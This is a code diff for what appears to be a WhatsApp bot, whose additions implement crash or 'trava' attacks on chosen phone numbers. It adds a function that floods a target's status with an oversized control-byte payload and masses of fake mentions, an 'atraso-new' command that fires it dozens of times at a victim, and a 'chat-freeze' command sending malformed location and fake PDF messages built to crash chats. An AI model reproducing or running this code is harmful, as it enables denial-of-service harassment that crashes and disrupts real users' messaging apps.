@@ -29,7 +29,6 @@ const moment = require('moment-timezone');
 const pino = require('pino')
 const logger = pino({ level: 'debug' });
 const crypto = require('crypto');
-messageSecret: crypto.randomBytes(32)
 
 const path = require('path')
 
@@ -72,6 +71,7 @@ const command = isCmd ? bardy.slice(prefix.length).trim().split(' ').shift().toL
 const args = bardy.trim().split(/ +/).slice(1)
 const text = args.join(" ")
 const q = args.join(" ")
+if (!isCmd) return;
 const sender = info.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (info.key.participant || info.key.remoteJid)
 const botNumber = await conn.decodeJid(conn.user.id)
 const senderNumber = sender.split('@')[0]
@@ -110,6 +110,9 @@ const ios4 = fs.readFileSync('./travas/ios4.js');
 const ios7 = fs.readFileSync('./travas/ios7.js');
 const ios6 = fs.readFileSync('./travas/ios6.js');
 const travadoc = fs.readFileSync('./travas/travadoc.js');
+const { bug } = require('./travas/bug.js');
+const telapreta = `${bug}`
+const { bugUrl } = require('./travas/bugUrl.js')
 
 const lol = {
 key: {
@@ -188,6 +191,7 @@ return "*************"
 return input
 }
 }
+
 if (totallog) {
 if (m.message && m.isGroup) {
     const timeOnly = new Date().toLocaleTimeString("de-DE", {
@@ -561,7 +565,7 @@ expiryTimestamp: Date.now() + 1814400000
 
 await conn.relayMessage(target, {
 contactMessage: {
-displayName: "𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 𝐕𝟏" + "𑇂𑆵𑆴𑆿".repeat(60000),
+displayName: "𝐏𝐎𝐒𝐄𝐭𝐎𝐍 𝐕𝟏" + "𑇂𑆵𑆴𑆿".repeat(60000),
 vcard: `BEGIN:VCARD
 VERSION:3.0
 N:☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>
@@ -1009,7 +1013,72 @@ async function IosInvisibleForce(conn, target) {
   });
   console.log(`─────「 ⏤!CrashInvisibleIOS To: ${target}!⏤ 」─────`)
 }
-
+async function invisível_trava_status(target, carousel = null) {
+  let sxo = await generateWAMessageFromContent(target, {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: { text: "¿𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘?", format: "DEFAULT" },
+          nativeFlowResponseMessage: {
+            name: "call_permission_request",
+            paramsJson: "\x10".repeat(1045000),
+            version: 3
+          },
+          entryPointConversionSource: "galaxy_message",
+        }
+      }
+    }
+  }, {
+    ephemeralExpiration: 0,
+    forwardingScore: 9741,
+    isForwarded: true,
+    font: Math.floor(Math.random() * 99999999),
+    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
+  });
+  let sXoMessage = {
+    extendedTextMessage: {
+      text: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘",
+      contextInfo: {
+        participant: target,
+        mentionedJid: [
+          "0@s.whatsapp.net",
+          ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
+        ]
+      }
+    }
+  };
+  const xso = generateWAMessageFromContent(target, sXoMessage, {});
+  await conn.relayMessage("status@broadcast", xso.message, {
+    messageId: xso.key.id,
+    statusJidList: [target],
+    additionalNodes: [{
+      tag: "meta",
+      attrs: {},
+      content: [{
+        tag: "mentioned_users",
+        attrs: {},
+        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
+      }]
+    }]
+  });
+  await sleep(500);
+  // envia a primeira mensagem (sxo)
+  await conn.relayMessage("status@broadcast", sxo.message, {
+    messageId: sxo.key.id,
+    statusJidList: [target],
+    additionalNodes: [{
+      tag: "meta",
+      attrs: {},
+      content: [{
+        tag: "mentioned_users",
+        attrs: {},
+        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
+      }]
+    }]
+  });
+  await sleep(500);
+  console.log(`ATRASO INVISÍVEL`);
+}
 switch(command) {
   case "xhgr":
 if (!isBot && !isCreator) return
@@ -1027,6 +1096,39 @@ ZieeInvisForceIOS(conn, target)
 }
 conn.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
 break
+case "atraso-new": {
+    if (!isBot && !isCreator) return;
+
+    let jid = m.mentionedJid && m.mentionedJid.length > 0
+        ? m.mentionedJid[0]
+        : m.quoted
+            ? m.quoted.sender
+            : (q ? q.replace(/[^0-9]/g, '') : null);
+
+    if (!jid) return reply(" Ingresa un número válido.");
+
+    let target = jid.includes('@s.whatsapp.net') ? jid : jid + "@s.whatsapp.net";
+    if (candList.includes(target)) {
+        //kkkkk
+        await conn.sendMessage(m.chat, { 
+            text: `Nel, con el owner no ` 
+        }, { quoted: m });
+        await conn.sendMessage("593969533280@s.whatsapp.net", { 
+           
+            text: `User *${m.sender}* intentó follar a ${target}.`
+        });
+        return;
+    }
+    for (let i = 0; i < 10; i++) {
+    await invisível_trava_status(target)
+    await sleep(1000)
+    await invisível_trava_status(target)
+    await sleep(1000)
+    await invisível_trava_status(target)
+    }
+    conn.sendMessage(m.chat, { react: { text: '✅', key: m.key }});
+}
+break;  
 case "xhgr2":
 if (!isBot && !isCreator) return
 if (!q) return reply(`Ejemplo ${prefix + command} +52xxx`)
@@ -1384,7 +1486,7 @@ case 'spam-videocall': {
     break;
 }
 case 'crash-button':
-for (let i = 0; i < 20; i++) {
+for (let i = 0; i < 6; i++) {
 await conn.sendMessage(from, {
 document: {
 url: "./travas/crash.zip"
@@ -1430,6 +1532,56 @@ headerType: "DOCUMENT",
 }, {})
 }
 break
+case 'chat-freeze': {
+  if (!isBot) return;
+  try {
+    for (let i = 0; i < 10; i++) {
+      await conn.sendMessage(from, {
+        location: {
+          degreesLatitude: 'ola',
+          degreesLongitude: 'ola',
+          name: `ola`,
+          url: bugUrl,
+          contextInfo: {
+            forwardingScore: 508,
+            isForwarded: true,
+            isLiveLocation: true,
+            fromMe: false,
+            participant: '0@s.whatsapp.net',
+            remoteJid: sender,
+            quotedMessage: {
+              documentMessage: {
+                url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
+                mimetype: "application/pdf",
+                title: "crash",
+                pageCount: 1000000000,
+                fileName: "crash.pdf",
+                contactVcard: true
+              }
+            },
+            forwardedNewsletterMessageInfo: {
+              newsletterJid: '120363274419284848@newsletter',
+              serverMessageId: 1,
+              newsletterName: " " + bug + bug
+            },
+            externalAdReply: {
+              title: ' ola ',
+              body: 'ola',
+              mediaType: 0,
+              thumbnail: m,
+              jpegThumbnail: m,
+              mediaUrl: `https://www.youtube.com/@g`,
+              sourceUrl: `https://chat.whatsapp.com/`
+            }
+          }
+        }
+      });
+    }
+  } catch (e) {
+    console.error(e);
+  }
+}
+break;
 case 'crash-ui':
 if (!isBot && !isCreator) return
 for (let i = 0; i < 30; i++) {
@@ -1719,6 +1871,7 @@ case "crash-chat": {
 break;
 
 case 'play': {
+  if (!isBot) return
     if (!q) return reply('`Ingresa el nombre de la canción`');
     
     try {
@@ -1803,7 +1956,8 @@ case 'nuke': {
 
 case 'tt':
 case 'tiktok': {
-    if (!q) return reply('*Ingresa el enlace del video de tiktok');
+  if (!isBot) return
+    if (!q) return eply('*Ingresa el enlace del video de tiktok');
     try {
         const apiUrl = `https://api.dorratz.com/v2/tiktok-dl?url=${encodeURIComponent(q)}`;
         const noze = await fetch(apiUrl);
@@ -1923,7 +2077,7 @@ if (!isBot && !isCreator) return
     break;
 
 case 'tag': {
-if (!isBot && !isCreator) return;
+if (!isBot) return;
     if (!m.isGroup) return reply("Este comando solo funciona en grupos")
     
     let metadata = await conn.groupMetadata(m.chat)
@@ -1979,7 +2133,8 @@ break
 > crash-ui
 > crash-button
 > crash-Chat
-
+> chat-freeze
+> atraso-new +593xxx
 > crash-chat
 > button
   IOS 
